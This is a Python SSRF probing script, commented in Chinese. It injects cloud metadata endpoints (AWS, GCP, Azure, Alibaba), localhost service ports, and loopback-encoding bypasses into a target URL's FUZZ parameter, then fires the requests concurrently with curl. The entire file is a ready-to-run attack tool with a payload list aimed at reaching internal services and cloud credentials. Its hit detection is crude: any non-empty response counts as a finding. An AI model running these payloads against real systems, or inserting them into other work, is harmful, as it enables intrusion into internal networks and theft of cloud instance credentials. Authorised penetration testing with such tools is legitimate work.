#!/usr/bin/env python3
"""SSRF检测器 — 云元数据+内网探测+协议绕过"""
import argparse, json, subprocess, sys, urllib.parse, concurrent.futures

SSRF_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS元数据"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP元数据"),
    ("http://169.254.169.254/metadata/instance?api-version=2021", "Azure元数据"),
    ("http://100.100.100.200/latest/meta-data/", "阿里云元数据"),
    ("http://127.0.0.1:8080/", "本地8080"),
    ("http://127.0.0.1:6379/", "本地Redis"),
    ("http://127.0.0.1:9200/", "本地ES"),
    ("http://127.0.0.1:3306/", "本地MySQL"),
    ("http://localhost:22/", "本地SSH"),
    ("http://[::1]:80/", "IPv6本地"),
    ("http://0x7f000001/", "十六进制绕过"),
    ("http://2130706433/", "十进制绕过"),
    ("http://127.0.0.1.nip.io/", "DNS回环"),
]

def check_ssrf(target, ssrf_url, timeout=8):
    """测试SSRF"""
    encoded = urllib.parse.quote(ssrf_url[0])
    test_url = target.replace("FUZZ", encoded)
    try:
        r = subprocess.run(["curl", "-sk", "-m", str(timeout), test_url, "-w", "|%{http_code}|%{size_download}"], capture_output=True, text=True, timeout=timeout+5)
        code = "000"
        size = 0
        if "|" in r.stdout:
            m = re.search(r"\|(\d+)\|(\d+)", r.stdout)
            if m: code, size = m.group(1), int(m.group(2))
        
        if code != "000" and size > 0:
            return {"ssrf_url": ssrf_url[0], "label": ssrf_url[1], "code": code, "size": size}
    except: pass
    return None

def main():
    ap = argparse.ArgumentParser(description="SSRF检测器")
    ap.add_argument("--target", required=True, help="目标URL，注入点用FUZZ标记")
    ap.add_argument("--threads", type=int, default=10)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("-o", "--output")
    args = ap.parse_args()
    
    if not args.json:
        print(f"[*] SSRF检测: {args.target}")
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(check_ssrf, args.target, t): t for t in SSRF_TARGETS}
        for future in concurrent.futures.as_completed(futures):
            r = future.result()
            if r:
                results.append(r)
                if not args.json:
                    print(f"  [!] {r['label']}: HTTP {r['code']} ({r['size']}B)")
    
    result = {"target": args.target, "vulnerable": len(results) > 0, "findings": results}
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
    if args.json:
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        if results:
            print(f"\n⚠️ SSRF漏洞: {len(results)}个内部资源可达")
        else:
            print("\n  未发现SSRF")

if __name__ == "__main__":
    import re
    main()